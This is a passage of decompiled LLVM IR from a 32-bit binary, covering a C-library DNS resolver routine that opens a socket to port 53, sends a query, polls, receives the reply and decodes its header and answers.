  %v2_8055ec5 = icmp slt i32 %v0_8055ebb, 0
  br i1 %v2_8055ec5, label %dec_label_pc_8056329, label %dec_label_pc_8055ecd

dec_label_pc_8055ecd:                             ; preds = %dec_label_pc_8055e6e
  %v1_8055ecd = add i32 %v0_8055ec0, 172
  %v2_8055ecd = inttoptr i32 %v1_8055ecd to i16*
  store i16 2, i16* %v2_8055ecd, align 2
  %v1_8055ed7 = load i32, i32* @esp, align 4
  %v2_8055ed7 = add i32 %v1_8055ed7, -4
  %v3_8055ed7 = inttoptr i32 %v2_8055ed7 to i32*
  store i32 %v0_8055ebb, i32* %v3_8055ed7, align 4
  %v1_8055ed8 = add i32 %v1_8055ed7, 164
  store i32 %v1_8055ed8, i32* %eax.global-to-local, align 4
  %v2_8055edf = add i32 %v1_8055ed7, -8
  %v3_8055edf = inttoptr i32 %v2_8055edf to i32*
  store i32 %v1_8055ed8, i32* %v3_8055edf, align 4
  %v1_8055ee0 = add i32 %v1_8055ed7, 32
  %v2_8055ee0 = inttoptr i32 %v1_8055ee0 to i32*
  %v3_8055ee0 = load i32, i32* %v2_8055ee0, align 4
  %v5_8055ee0 = add i32 %v1_8055ed7, -12
  %v6_8055ee0 = inttoptr i32 %v5_8055ee0 to i32*
  store i32 %v3_8055ee0, i32* %v6_8055ee0, align 4
  %v1_8055ee4 = add i32 %v1_8055ed7, -16
  %v2_8055ee4 = inttoptr i32 %v1_8055ee4 to i32*
  store i32 10, i32* %v2_8055ee4, align 4
  %v6_8055ee6 = call i32 @inet_pton(i32 -1, i8* %v5_8055ee6, i32 %v3_8055d83, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_8055ee6, i32* %eax.global-to-local, align 4
  %v0_8055eeb = load i32, i32* @esp, align 4
  %v1_8055eeb = add i32 %v0_8055eeb, 16
  %tmp47 = icmp slt i32 %v6_8055ee6, 1
  br i1 %tmp47, label %dec_label_pc_8055efc, label %dec_label_pc_8055ef2

dec_label_pc_8055ef2:                             ; preds = %dec_label_pc_8055ecd
  %v1_8055ef2 = add i32 %v0_8055eeb, 172
  %v2_8055ef2 = inttoptr i32 %v1_8055ef2 to i16*
  store i16 10, i16* %v2_8055ef2, align 2
  %v0_8055efc.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8055efc

dec_label_pc_8055efc:                             ; preds = %dec_label_pc_8055ecd, %dec_label_pc_8055ef2
  %v0_8055f13 = phi i32 [ %v1_8055eeb, %dec_label_pc_8055ecd ], [ %v0_8055efc.pre, %dec_label_pc_8055ef2 ]
  %v1_8055efc = add i32 %v0_8055f13, 156
  %v2_8055efc = inttoptr i32 %v1_8055efc to i16*
  %v3_8055efc = load i16, i16* %v2_8055efc, align 2
  %v12_8055efc = icmp eq i16 %v3_8055efc, 10
  %v1_8055f05 = icmp eq i1 %v12_8055efc, false
  %v1_8055f13 = add i32 %v0_8055f13, 158
  %v2_8055f13 = inttoptr i32 %v1_8055f13 to i16*
  store i16 13568, i16* %v2_8055f13, align 2
  %v0_8055f1d = load i32, i32* @esp, align 4
  br i1 %v1_8055f05, label %dec_label_pc_8055f13, label %dec_label_pc_8055f33

dec_label_pc_8055f13:                             ; preds = %dec_label_pc_8055efc
  %v1_8055f20 = add i32 %v0_8055f1d, 32
  %v2_8055f20 = inttoptr i32 %v1_8055f20 to i32*
  %v3_8055f20 = load i32, i32* %v2_8055f20, align 4
  %v5_8055f20 = add i32 %v0_8055f1d, -16
  %v6_8055f20 = inttoptr i32 %v5_8055f20 to i32*
  store i32 %v3_8055f20, i32* %v6_8055f20, align 4
  %v1_8055f24 = call i32 @inet_addr(i32 -1)
  store i32 %v1_8055f24, i32* %eax.global-to-local, align 4
  %v1_8055f29 = load i32, i32* @esp, align 4
  %v2_8055f29 = add i32 %v1_8055f29, 176
  %v3_8055f29 = inttoptr i32 %v2_8055f29 to i32*
  store i32 %v1_8055f24, i32* %v3_8055f29, align 4
  %v0_8055f30 = load i32, i32* @esp, align 4
  %v1_8055f30 = add i32 %v0_8055f30, 16
  br label %dec_label_pc_8055f33

dec_label_pc_8055f33:                             ; preds = %dec_label_pc_8055efc, %dec_label_pc_8055f13
  %v1_8055f33 = phi i32 [ %v1_8055f30, %dec_label_pc_8055f13 ], [ %v0_8055f1d, %dec_label_pc_8055efc ]
  %v0_8055f33 = load i32, i32* @ecx, align 4
  %v2_8055f33 = add i32 %v1_8055f33, -4
  %v3_8055f33 = inttoptr i32 %v2_8055f33 to i32*
  store i32 %v0_8055f33, i32* %v3_8055f33, align 4
  %v1_8055f34 = add i32 %v1_8055f33, -8
  %v2_8055f34 = inttoptr i32 %v1_8055f34 to i32*
  store i32 17, i32* %v2_8055f34, align 4
  %v1_8055f36 = add i32 %v1_8055f33, -12
  %v2_8055f36 = inttoptr i32 %v1_8055f36 to i32*
  store i32 2, i32* %v2_8055f36, align 4
  %v1_8055f38 = add i32 %v1_8055f33, 156
  %v2_8055f38 = inttoptr i32 %v1_8055f38 to i16*
  %v3_8055f38 = load i16, i16* %v2_8055f38, align 2
  %v4_8055f38 = zext i16 %v3_8055f38 to i32
  store i32 %v4_8055f38, i32* %eax.global-to-local, align 4
  %v2_8055f40 = add i32 %v1_8055f33, -16
  %v3_8055f40 = inttoptr i32 %v2_8055f40 to i32*
  store i32 %v4_8055f38, i32* %v3_8055f40, align 4
  %v4_8055f41 = call i32 @socket(i32 -1, i32 %v15_8055d24, i32 %v3_8055d83)
  store i32 %v4_8055f41, i32* %eax.global-to-local, align 4
  %v1_8055f46 = load i32, i32* @esp, align 4
  %v2_8055f46 = add i32 %v1_8055f46, 36
  %v3_8055f46 = inttoptr i32 %v2_8055f46 to i32*
  store i32 %v4_8055f41, i32* %v3_8055f46, align 4
  %v0_8055f4a = load i32, i32* @esp, align 4
  %v1_8055f4a = add i32 %v0_8055f4a, 16
  %v0_8055f4d = load i32, i32* %eax.global-to-local, align 4
  %v2_8055f4d = icmp slt i32 %v0_8055f4d, 0
  br i1 %v2_8055f4d, label %dec_label_pc_8055f7a, label %dec_label_pc_8055f51

dec_label_pc_8055f51:                             ; preds = %dec_label_pc_8055f33
  %v1_8055f51 = add i32 %v0_8055f4a, 172
  store i32 %v1_8055f51, i32* %eax.global-to-local, align 4
  %v0_8055f58 = load i32, i32* @edx, align 4
  %v2_8055f58 = add i32 %v0_8055f4a, 12
  %v3_8055f58 = inttoptr i32 %v2_8055f58 to i32*
  store i32 %v0_8055f58, i32* %v3_8055f58, align 4
  %v1_8055f59 = add i32 %v0_8055f4a, 8
  %v2_8055f59 = inttoptr i32 %v1_8055f59 to i32*
  store i32 28, i32* %v2_8055f59, align 4
  %v0_8055f5b = load i32, i32* %eax.global-to-local, align 4
  %v2_8055f5b = add i32 %v0_8055f4a, 4
  %v3_8055f5b = inttoptr i32 %v2_8055f5b to i32*
  store i32 %v0_8055f5b, i32* %v3_8055f5b, align 4
  %v1_8055f5c = add i32 %v0_8055f4a, 36
  %v2_8055f5c = inttoptr i32 %v1_8055f5c to i32*
  %v3_8055f5c = load i32, i32* %v2_8055f5c, align 4
  %v6_8055f5c = inttoptr i32 %v0_8055f4a to i32*
  store i32 %v3_8055f5c, i32* %v6_8055f5c, align 4
  %v4_8055f60 = call i32 @__libc_connect(i32 -1, i32 %v15_8055d24, i32 %v3_8055d83)
  store i32 %v4_8055f60, i32* %eax.global-to-local, align 4
  %v0_8055f65 = load i32, i32* @esp, align 4
  %v2_8055f68 = icmp slt i32 %v4_8055f60, 0
  %v1_8055f6a = icmp eq i1 %v2_8055f68, false
  br i1 %v1_8055f6a, label %dec_label_pc_8055f83, label %dec_label_pc_8055f6c

dec_label_pc_8055f6c:                             ; preds = %dec_label_pc_8055f51
  %v1_8055f6c = call i32 @__errno_location(i32 -1)
  store i32 %v1_8055f6c, i32* %eax.global-to-local, align 4
  %v1_8055f71 = inttoptr i32 %v1_8055f6c to i32*
  %v2_8055f71 = load i32, i32* %v1_8055f71, align 4
  %v11_8055f71 = icmp eq i32 %v2_8055f71, 101
  %v0_80562e3.pre = load i32, i32* @esp, align 4
  br i1 %v11_8055f71, label %dec_label_pc_80562e3, label %dec_label_pc_8055f7a

dec_label_pc_8055f7a:                             ; preds = %dec_label_pc_8055f6c, %dec_label_pc_8055f33
  %v17_8055f7a = phi i32 [ %v1_8055f4a, %dec_label_pc_8055f33 ], [ %v0_80562e3.pre, %dec_label_pc_8055f6c ]
  %v1_8055f7a = add i32 %v17_8055f7a, 28
  %v2_8055f7a = inttoptr i32 %v1_8055f7a to i32*
  %v3_8055f7a = load i32, i32* %v2_8055f7a, align 4
  %v4_8055f7a = add i32 %v3_8055f7a, 1
  store i32 %v4_8055f7a, i32* %v2_8055f7a, align 4
  br label %dec_label_pc_8056304.backedge

dec_label_pc_8055f83:                             ; preds = %dec_label_pc_8055f51
  %v0_8055f83 = load i32, i32* @ebx, align 4
  %v1_8055f83 = load i32, i32* @esi, align 4
  %v2_8055f83 = add i32 %v1_8055f83, %v0_8055f83
  store i32 %v2_8055f83, i32* %eax.global-to-local, align 4
  %v1_8055f86 = add i32 %v0_8055f65, 12
  %v2_8055f86 = inttoptr i32 %v1_8055f86 to i32*
  store i32 0, i32* %v2_8055f86, align 4
  %v0_8055f88 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055f88 = add i32 %v0_8055f65, 8
  %v3_8055f88 = inttoptr i32 %v2_8055f88 to i32*
  store i32 %v0_8055f88, i32* %v3_8055f88, align 4
  %v2_8055f89 = add i32 %v0_8055f65, 4
  %v3_8055f89 = inttoptr i32 %v2_8055f89 to i32*
  store i32 %v2_8055c96, i32* %v3_8055f89, align 4
  %v1_8055f8a = add i32 %v0_8055f65, 36
  %v2_8055f8a = inttoptr i32 %v1_8055f8a to i32*
  %v3_8055f8a = load i32, i32* %v2_8055f8a, align 4
  %v6_8055f8a = inttoptr i32 %v0_8055f65 to i32*
  store i32 %v3_8055f8a, i32* %v6_8055f8a, align 4
  %v5_8055f8e = call i32 @__libc_send(i32 -1, i32 %v15_8055d24, i32 %v3_8055d83, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8055f8e, i32* %eax.global-to-local, align 4
  %v0_8055f93 = load i32, i32* @esp, align 4
  %v1_8055f93 = add i32 %v0_8055f93, 36
  %v2_8055f93 = inttoptr i32 %v1_8055f93 to i32*
  %v3_8055f93 = load i32, i32* %v2_8055f93, align 4
  %v2_8055f97 = add i32 %v0_8055f93, 228
  %v3_8055f97 = inttoptr i32 %v2_8055f97 to i32*
  store i32 %v3_8055f93, i32* %v3_8055f97, align 4
  %v0_8055f9e = load i32, i32* @esp, align 4
  %v1_8055f9e = add i32 %v0_8055f9e, 232
  %v2_8055f9e = inttoptr i32 %v1_8055f9e to i16*
  store i16 1, i16* %v2_8055f9e, align 2
  %v0_8055fa8 = load i32, i32* @esp, align 4
  %v1_8055fab = add i32 %v0_8055fa8, 8
  %v2_8055fab = inttoptr i32 %v1_8055fab to i32*
  store i32 10000, i32* %v2_8055fab, align 4
  %v1_8055fb0 = add i32 %v0_8055fa8, 4
  %v2_8055fb0 = inttoptr i32 %v1_8055fb0 to i32*
  store i32 1, i32* %v2_8055fb0, align 4
  %v1_8055fb2 = add i32 %v0_8055fa8, 228
  store i32 %v1_8055fb2, i32* %eax.global-to-local, align 4
  %v3_8055fb9 = inttoptr i32 %v0_8055fa8 to i32*
  store i32 %v1_8055fb2, i32* %v3_8055fb9, align 4
  %v0_8055fba = call i32 @__libc_poll()
  store i32 %v0_8055fba, i32* %eax.global-to-local, align 4
  %v0_8055fbf = load i32, i32* @esp, align 4
  %v1_8055fbf = add i32 %v0_8055fbf, 16
  %tmp48 = icmp slt i32 %v0_8055fba, 1
  br i1 %tmp48, label %dec_label_pc_80562e3, label %dec_label_pc_8055fca

dec_label_pc_8055fca:                             ; preds = %dec_label_pc_8055f83
  %v1_8055fca = add i32 %v0_8055fbf, 12
  %v2_8055fca = inttoptr i32 %v1_8055fca to i32*
  store i32 0, i32* %v2_8055fca, align 4
  %v1_8055fcc = add i32 %v0_8055fbf, 8
  %v2_8055fcc = inttoptr i32 %v1_8055fcc to i32*
  store i32 512, i32* %v2_8055fcc, align 4
  %v2_8055fd1 = add i32 %v0_8055fbf, 4
  %v3_8055fd1 = inttoptr i32 %v2_8055fd1 to i32*
  store i32 %v2_8055c96, i32* %v3_8055fd1, align 4
  %v1_8055fd2 = add i32 %v0_8055fbf, 36
  %v2_8055fd2 = inttoptr i32 %v1_8055fd2 to i32*
  %v3_8055fd2 = load i32, i32* %v2_8055fd2, align 4
  %v6_8055fd2 = inttoptr i32 %v0_8055fbf to i32*
  store i32 %v3_8055fd2, i32* %v6_8055fd2, align 4
  %v5_8055fd6 = call i32 @__libc_recv(i32 -1, i32 %v15_8055d24, i32 %v3_8055d83, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8055fd6, i32* @eax, align 4
  %v1_8055fdb = load i32, i32* @esp, align 4
  %v2_8055fdb = add i32 %v1_8055fdb, 32
  %v3_8055fdb = inttoptr i32 %v2_8055fdb to i32*
  store i32 %v5_8055fd6, i32* %v3_8055fdb, align 4
  %v0_8055fdf = load i32, i32* @esp, align 4
  %v1_8055fdf = add i32 %v0_8055fdf, 16
  %v7_8055fe5 = icmp sgt i32 %v5_8055fd6, 11
  br i1 %v7_8055fe5, label %dec_label_pc_8055feb, label %dec_label_pc_8056298

dec_label_pc_8055feb:                             ; preds = %dec_label_pc_8055fca
  %v0_8055feb = load i32, i32* @ebx, align 4
  %v2_8055feb = add i32 %v0_8055fdf, 12
  %v3_8055feb = inttoptr i32 %v2_8055feb to i32*
  store i32 %v0_8055feb, i32* %v3_8055feb, align 4
  %v0_8055fec = load i32, i32* @ebx, align 4
  %v2_8055fec = add i32 %v0_8055fdf, 8
  %v3_8055fec = inttoptr i32 %v2_8055fec to i32*
  store i32 %v0_8055fec, i32* %v3_8055fec, align 4
  %v1_8055fed = add i32 %v0_8055fdf, 84
  store i32 %v1_8055fed, i32* %eax.global-to-local, align 4
  %v2_8055ff1 = add i32 %v0_8055fdf, 4
  %v3_8055ff1 = inttoptr i32 %v2_8055ff1 to i32*
  store i32 %v1_8055fed, i32* %v3_8055ff1, align 4
  %v3_8055ff2 = inttoptr i32 %v0_8055fdf to i32*
  store i32 %v2_8055c96, i32* %v3_8055ff2, align 4
  %v0_8055ff3 = call i32 @__decode_header()
  store i32 %v0_8055ff3, i32* %eax.global-to-local, align 4
  %v0_8055ff8 = load i32, i32* @esp, align 4
  %v1_8055ff8 = add i32 %v0_8055ff8, 84
  %v2_8055ff8 = inttoptr i32 %v1_8055ff8 to i32*
  %v3_8055ff8 = load i32, i32* %v2_8055ff8, align 4
  store i32 %v3_8055ff8, i32* %edx.global-to-local, align 4
  %v2_8055ffc = add i32 %v0_8055ff8, 72
  %v3_8055ffc = inttoptr i32 %v2_8055ffc to i32*
  store i32 %v3_8055ff8, i32* %v3_8055ffc, align 4
  %v0_8056000 = load i32, i32* @esp, align 4
  %v1_8056000 = add i32 %v0_8056000, 16
  %v1_8056003 = add i32 %v0_8056000, 60
  %v2_8056003 = inttoptr i32 %v1_8056003 to i32*
  %v3_8056003 = load i32, i32* %v2_8056003, align 4
  store i32 %v3_8056003, i32* @eax, align 4
  %v0_8056007 = load i32, i32* %edx.global-to-local, align 4
  %v12_8056007 = icmp eq i32 %v0_8056007, %v3_8056003
  %v1_8056009 = icmp eq i1 %v12_8056007, false
  br i1 %v1_8056009, label %dec_label_pc_8056298, label %dec_label_pc_805600f

dec_label_pc_805600f:                             ; preds = %dec_label_pc_8055feb
  %v1_805600f = add i32 %v0_8056000, 88
  %v2_805600f = inttoptr i32 %v1_805600f to i32*
  %v3_805600f = load i32, i32* %v2_805600f, align 4
  %v4_805600f = icmp eq i32 %v3_805600f, 0
  br i1 %v4_805600f, label %dec_label_pc_8056298, label %dec_label_pc_805601a

dec_label_pc_805601a:                             ; preds = %dec_label_pc_805600f
  %v1_805601a = add i32 %v0_8056000, 112
  %v2_805601a = inttoptr i32 %v1_805601a to i32*
  %v3_805601a = load i32, i32* %v2_805601a, align 4
  store i32 %v3_805601a, i32* @eax, align 4
  %v9_805601e = icmp eq i32 %v3_805601a, 3
  %v1_8056021 = icmp eq i1 %v9_805601e, false
  br i1 %v1_8056021, label %dec_label_pc_8056089, label %dec_label_pc_8056023

dec_label_pc_8056023:                             ; preds = %dec_label_pc_805601a
  %v1_8056023 = add i32 %v0_8056000, 67
  %v2_8056023 = inttoptr i32 %v1_8056023 to i8*
  %v3_8056023 = load i8, i8* %v2_8056023, align 1
  %v4_8056023 = icmp eq i8 %v3_8056023, 0
  %v1_8056028 = icmp eq i1 %v4_8056023, false
  br i1 %v1_8056028, label %dec_label_pc_8056079, label %dec_label_pc_805602a

dec_label_pc_805602a:                             ; preds = %dec_label_pc_8056023
  %v0_805602a = load i32, i32* @ecx, align 4
  %v2_805602a = add i32 %v0_8056000, 12
  %v3_805602a = inttoptr i32 %v2_805602a to i32*
  store i32 %v0_805602a, i32* %v3_805602a, align 4
  %v1_805602b = add i32 %v0_8056000, 8
  %v2_805602b = inttoptr i32 %v1_805602b to i32*
  store i32 ptrtoint (i32* @global_var_805f888.953 to i32), i32* %v2_805602b, align 4
  %v1_8056030 = add i32 %v0_8056000, 4
  %v2_8056030 = inttoptr i32 %v1_8056030 to i32*
  store i32 134564427, i32* %v2_8056030, align 4
  %v1_8056035 = add i32 %v0_8056000, 200
  store i32 %v1_8056035, i32* @esi, align 4
  %v3_805603c = inttoptr i32 %v0_8056000 to i32*
  store i32 %v1_8056035, i32* %v3_805603c, align 4
  %v2_805603d = call i32 @__pthread_return_void(i32 -1, i32 %v15_8055d24)
  store i32 %v2_805603d, i32* %eax.global-to-local, align 4
  %v0_8056042 = load i32, i32* @esp, align 4
  %v1_8056042 = inttoptr i32 %v0_8056042 to i32*
  store i32 ptrtoint (i32* @global_var_805f888.953 to i32), i32* %v1_8056042, align 4
  %v1_8056049 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8056049, i32* %eax.global-to-local, align 4
  %v0_805604e = load i32, i32* @esp, align 4
  %v1_805604e = inttoptr i32 %v0_805604e to i32*
  %v2_805604e = load i32, i32* %v1_805604e, align 4
  store i32 %v2_805604e, i32* @eax, align 4
  %v3_805604e = add i32 %v0_805604e, 4
  %v1_805604f = inttoptr i32 %v3_805604e to i32*
  %v2_805604f = load i32, i32* %v1_805604f, align 4
  store i32 %v2_805604f, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_805604f, align 4
  %v0_8056052 = load i32, i32* @esi, align 4
  store i32 %v0_8056052, i32* %v1_805604e, align 4
  %v0_8056053 = load i32, i32* @global_var_8065f78.1018, align 8
  store i32 %v0_8056053, i32* %ebx.global-to-local, align 4
  %v2_8056059 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8055d24)
  store i32 %v2_8056059, i32* %eax.global-to-local, align 4
  %v0_805605e = load i32, i32* @esp, align 4
  %v1_8056061 = add i32 %v0_8056053, -1
  store i32 %v1_8056061, i32* @ebx, align 4
  %v1_8056062 = add i32 %v0_805605e, 52
  %v2_8056062 = inttoptr i32 %v1_8056062 to i32*
  %v3_8056062 = load i32, i32* %v2_8056062, align 4
  %v5_8056062 = sub i32 %v3_8056062, %v1_8056061
  %v11_8056062 = xor i32 %v3_8056062, %v1_8056061
  %v12_8056062 = xor i32 %v5_8056062, %v3_8056062
  %v13_8056062 = and i32 %v12_8056062, %v11_8056062
  %v14_8056062 = icmp slt i32 %v13_8056062, 0
  %v16_8056062 = icmp slt i32 %v5_8056062, 0
  %v2_8056066 = icmp eq i1 %v16_8056062, %v14_8056062
  br i1 %v2_8056066, label %dec_label_pc_8056079, label %dec_label_pc_8056068

dec_label_pc_8056068:                             ; preds = %dec_label_pc_805602a
  %v4_8056068 = add i32 %v3_8056062, 1
  store i32 %v4_8056068, i32* %v2_8056062, align 4
  %v0_805606c = load i32, i32* @esp, align 4
  %v1_805606c = add i32 %v0_805606c, 56
  %v2_805606c = inttoptr i32 %v1_805606c to i32*
  %v3_805606c = load i32, i32* %v2_805606c, align 4
  store i32 %v3_805606c, i32* %edx.global-to-local, align 4
  %v2_8056070 = add i32 %v0_805606c, 44
  %v3_8056070 = inttoptr i32 %v2_8056070 to i32*
  store i32 %v3_805606c, i32* %v3_8056070, align 4
  br label %dec_label_pc_8056304.backedge

dec_label_pc_8056079:                             ; preds = %dec_label_pc_805602a, %dec_label_pc_8056023
  %v0_8056079 = call i32 @__GI___h_errno_location()
  store i32 %v0_8056079, i32* %eax.global-to-local, align 4
  %v1_805607e = inttoptr i32 %v0_8056079 to i32*
  store i32 1, i32* %v1_805607e, align 4
  br label %dec_label_pc_805633c

dec_label_pc_8056089:                             ; preds = %dec_label_pc_805601a
  %v1_8056089 = icmp eq i32 %v3_805601a, 0
  %v1_805608b = icmp eq i1 %v1_8056089, false
  br i1 %v1_805608b, label %dec_label_pc_8056298, label %dec_label_pc_8056091

dec_label_pc_8056091:                             ; preds = %dec_label_pc_8056089
  %v1_8056091 = add i32 %v0_8056000, 120
  %v2_8056091 = inttoptr i32 %v1_8056091 to i32*
  %v3_8056091 = load i32, i32* %v2_8056091, align 4
  %tmp49 = icmp slt i32 %v3_8056091, 1
  br i1 %tmp49, label %dec_label_pc_80560a1, label %dec_label_pc_8056098

dec_label_pc_8056098:                             ; preds = %dec_label_pc_8056091
  store i32 0, i32* @ebx, align 4
  store i32 12, i32* @esi, align 4
  %v2_80560c055 = add i32 %v0_8056000, 116
  %v3_80560c056 = inttoptr i32 %v2_80560c055 to i32*
  %v4_80560c057 = load i32, i32* %v3_80560c056, align 4
  %v5_80560c058 = sub i32 0, %v4_80560c057
  %v13_80560c062 = and i32 %v4_80560c057, %v5_80560c058
  %v14_80560c063 = icmp slt i32 %v13_80560c062, 0
  %v16_80560c065 = icmp slt i32 %v5_80560c058, 0
  %v2_80560c466 = icmp eq i1 %v16_80560c065, %v14_80560c063
  br i1 %v2_80560c466, label %dec_label_pc_80560c6, label %dec_label_pc_80560b1

dec_label_pc_80560a1:                             ; preds = %dec_label_pc_8056091
  %v0_80560a1 = call i32 @__GI___h_errno_location()
  store i32 %v0_80560a1, i32* %eax.global-to-local, align 4
  %v1_80560a6 = inttoptr i32 %v0_80560a1 to i32*
  store i32 4, i32* %v1_80560a6, align 4
  br label %dec_label_pc_805633c

dec_label_pc_80560b1:                             ; preds = %dec_label_pc_8056098, %dec_label_pc_80560b1
  %v0_80560c868 = phi i32 [ %v1_80560bd, %dec_label_pc_80560b1 ], [ %v1_8056000, %dec_label_pc_8056098 ]
  %v0_80560b167 = phi i32 [ %v0_80560b5, %dec_label_pc_80560b1 ], [ %v3_805601a, %dec_label_pc_8056098 ]
  %v2_80560b1 = add i32 %v0_80560c868, -4
  %v3_80560b1 = inttoptr i32 %v2_80560b1 to i32*
  store i32 %v0_80560b167, i32* %v3_80560b1, align 4
  %v0_80560b2 = load i32, i32* @eax, align 4
  %v2_80560b2 = add i32 %v0_80560c868, -8
  %v3_80560b2 = inttoptr i32 %v2_80560b2 to i32*
  store i32 %v0_80560b2, i32* %v3_80560b2, align 4
  %v0_80560b3 = load i32, i32* @esi, align 4
  %v2_80560b3 = add i32 %v0_80560c868, -12
  %v3_80560b3 = inttoptr i32 %v2_80560b3 to i32*
  store i32 %v0_80560b3, i32* %v3_80560b3, align 4
  %v2_80560b4 = add i32 %v0_80560c868, -16
  %v3_80560b4 = inttoptr i32 %v2_80560b4 to i32*
  store i32 %v2_8055c96, i32* %v3_80560b4, align 4
  %v0_80560b5 = call i32 @__length_question()
  store i32 %v0_80560b5, i32* @eax, align 4
  %v0_80560ba = load i32, i32* @ebx, align 4
  %v1_80560ba = add i32 %v0_80560ba, 1
  store i32 %v1_80560ba, i32* @ebx, align 4
  %v0_80560bb = load i32, i32* @esi, align 4
  %v2_80560bb = add i32 %v0_80560bb, %v0_80560b5
  store i32 %v2_80560bb, i32* @esi, align 4
  %v0_80560bd = load i32, i32* @esp, align 4
  %v1_80560bd = add i32 %v0_80560bd, 16
  %v2_80560c0 = add i32 %v0_80560bd, 116
  %v3_80560c0 = inttoptr i32 %v2_80560c0 to i32*
  %v4_80560c0 = load i32, i32* %v3_80560c0, align 4
  %v5_80560c0 = sub i32 %v1_80560ba, %v4_80560c0
  %v11_80560c0 = xor i32 %v4_80560c0, %v1_80560ba
  %v12_80560c0 = xor i32 %v5_80560c0, %v1_80560ba
  %v13_80560c0 = and i32 %v12_80560c0, %v11_80560c0
  %v14_80560c0 = icmp slt i32 %v13_80560c0, 0
  %v16_80560c0 = icmp slt i32 %v5_80560c0, 0
  %v2_80560c4 = icmp eq i1 %v16_80560c0, %v14_80560c0
  br i1 %v2_80560c4, label %dec_label_pc_80560c6, label %dec_label_pc_80560b1

dec_label_pc_80560c6:                             ; preds = %dec_label_pc_80560b1, %dec_label_pc_8056098
  %v0_80560c8.lcssa = phi i32 [ %v1_8056000, %dec_label_pc_8056098 ], [ %v1_80560bd, %dec_label_pc_80560b1 ]
  store i32 0, i32* @ebx, align 4
  %v1_80560c8 = add i32 %v0_80560c8.lcssa, 27
  %v2_80560c8 = inttoptr i32 %v1_80560c8 to i8*
  store i8 1, i8* %v2_80560c8, align 1
  %v0_80561f6.pre = load i32, i32* @ebx, align 4
  %v1_80561f6.pre = load i32, i32* @esp, align 4
  %v2_80561f669 = add i32 %v1_80561f6.pre, 104
  %v3_80561f670 = inttoptr i32 %v2_80561f669 to i32*
  %v4_80561f671 = load i32, i32* %v3_80561f670, align 4
  %v5_80561f672 = sub i32 %v0_80561f6.pre, %v4_80561f671
  %v11_80561f674 = xor i32 %v4_80561f671, %v0_80561f6.pre
  %v12_80561f675 = xor i32 %v5_80561f672, %v0_80561f6.pre
  %v13_80561f676 = and i32 %v12_80561f675, %v11_80561f674
  %v14_80561f677 = icmp slt i32 %v13_80561f676, 0
  %v16_80561f679 = icmp slt i32 %v5_80561f672, 0
  %v2_80561fa80 = icmp eq i1 %v16_80561f679, %v14_80561f677
  br i1 %v2_80561fa80, label %dec_label_pc_8056206, label %dec_label_pc_80561fc.lr.ph

dec_label_pc_80561fc.lr.ph:                       ; preds = %dec_label_pc_80560c6
  %v0_80561fc.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80561fc

dec_label_pc_80560d2:                             ; preds = %dec_label_pc_80561fc
  %v1_80560d2 = add i32 %v0_80560d281, 116
  store i32 %v1_80560d2, i32* %eax.global-to-local, align 4
  %v2_80560d6 = add i32 %v0_80560d281, -4
  %v3_80560d6 = inttoptr i32 %v2_80560d6 to i32*
  store i32 %v1_80560d2, i32* %v3_80560d6, align 4
  %v3_80560d7 = load i32, i32* %v3_80561fc, align 4
  %v5_80560d7 = add i32 %v0_80560d281, -8
  %v6_80560d7 = inttoptr i32 %v5_80560d7 to i32*
  store i32 %v3_80560d7, i32* %v6_80560d7, align 4
  %v0_80560db = load i32, i32* @esi, align 4
  %v2_80560db = add i32 %v0_80560d281, -12
  %v3_80560db = inttoptr i32 %v2_80560db to i32*
  store i32 %v0_80560db, i32* %v3_80560db, align 4
  %v2_80560dc = add i32 %v0_80560d281, -16
  %v3_80560dc = inttoptr i32 %v2_80560dc to i32*
  store i32 %v2_8055c96, i32* %v3_80560dc, align 4
  %v0_80560dd = call i32 @__decode_answer()
  store i32 %v0_80560dd, i32* @eax, align 4
  %v1_80560e2 = load i32, i32* @esp, align 4
  %v2_80560e2 = add i32 %v1_80560e2, 68
  %v3_80560e2 = inttoptr i32 %v2_80560e2 to i32*
  store i32 %v0_80560dd, i32* %v3_80560e2, align 4
  %v0_80560e6 = load i32, i32* @esp, align 4
  %v1_80560e6 = add i32 %v0_80560e6, 16
  %v2_80560e9 = icmp slt i32 %v0_80560dd, 0
  %v1_80560eb = icmp eq i1 %v2_80560e9, false
  br i1 %v1_80560eb, label %dec_label_pc_8056105, label %dec_label_pc_80560ed

dec_label_pc_80560ed:                             ; preds = %dec_label_pc_80560d2
  %v0_80560ed = load i32, i32* @ebx, align 4
  %v1_80560ed = icmp eq i32 %v0_80560ed, 0
  br i1 %v1_80560ed, label %dec_label_pc_8056298, label %dec_label_pc_80560f5

dec_label_pc_80560f5:                             ; preds = %dec_label_pc_80560ed
  %v1_80560f5 = add i32 %v0_80560e6, 100
  %v2_80560f5 = inttoptr i32 %v1_80560f5 to i32*
  %v3_80560f5 = load i32, i32* %v2_80560f5, align 4
  %v4_80560f5 = icmp eq i32 %v3_80560f5, 0
  br i1 %v4_80560f5, label %dec_label_pc_8056298, label %dec_label_pc_8056206

dec_label_pc_8056105:                             ; preds = %dec_label_pc_80560d2
  %v1_8056105 = add i32 %v0_80560e6, 43
  %v2_8056105 = inttoptr i32 %v1_8056105 to i8*
  %v3_8056105 = load i8, i8* %v2_8056105, align 1
  %v4_8056105 = icmp eq i8 %v3_8056105, 0
  br i1 %v4_8056105, label %dec_label_pc_80561a6, label %dec_label_pc_8056110

dec_label_pc_8056110:                             ; preds = %dec_label_pc_8056105
  %v0_8056110 = load i32, i32* @edi, align 4
  %v1_8056110 = add i32 %v0_8056110, 28
  %v2_8056110 = inttoptr i32 %v1_8056110 to i32*
  %v3_8056110 = load i32, i32* %v2_8056110, align 4
  store i32 %v3_8056110, i32* %eax.global-to-local, align 4
  %v2_8056113 = add i32 %v0_80560e6, 160
  %v3_8056113 = inttoptr i32 %v2_8056113 to i32*
  store i32 %v3_8056110, i32* %v3_8056113, align 4
  %v0_805611a = load i32, i32* @edi, align 4
  %v1_805611a = add i32 %v0_805611a, 32
  %v2_805611a = inttoptr i32 %v1_805611a to i32*
  %v3_805611a = load i32, i32* %v2_805611a, align 4
  store i32 %v3_805611a, i32* %eax.global-to-local, align 4
